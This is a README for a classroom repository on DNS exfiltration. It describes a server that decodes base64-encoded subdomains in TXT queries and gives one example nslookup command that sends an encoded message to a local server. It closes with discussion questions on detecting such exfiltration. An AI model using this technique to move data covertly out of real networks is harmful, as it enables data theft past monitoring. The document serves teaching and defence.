# DNSexfil
This repo supports the begins of a classroom discussion about DNS exfiltration.

The "hello" returns the decoded message sent in a DNS query, along with the IP address the client would connect with.  It is a student effort to modify the server to handle a proper exfiltration.

dns_exfil_server.py as is responses only to TXT queries. The first subdomain is assumed to be a base64 URL encoded message.

Example, assuming dns_exfil_server.py is running locally: 
```
nslookup -q=txt VGhpcyBpcyBteSBtZXNzYWdlIHRvIHRoZSBzZXJ2ZXIsIHlvdXIgc2VydmFudA.fake 127.0.0.1
DNS request timed out.
    timeout was 2 seconds.
Server:  UnKnown
Address:  127.0.0.1

VGhpcyBpcyBteSBtZXNzYWdlIHRvIHRoZSBzZXJ2ZXIsIHlvdXIgc2VydmFudA.fake     text =

        "This is my message to the server, your servant. Server reply: connect to 11.22.33.44:5678"
```

Student discussion  
- How much data can be sent in a single DNS query?
- How would the affected site discover the exfiltration?
- Should the client after the hello exchange, shift to HTTPS?
- Would a DNS server discover the exfiltration?
- Would a network firewall discover the exfiltration?
- Would a DLP solution discover the exfiltration?
- What happens to the exfiltration if a UDP packet fails?
- Is adding encryption needed?
- How would you add encryption?
- Does the exfiltration care about losing UDP packets?
- What advantages/disadvantages does DNS over HTTPS (DoH) provide?
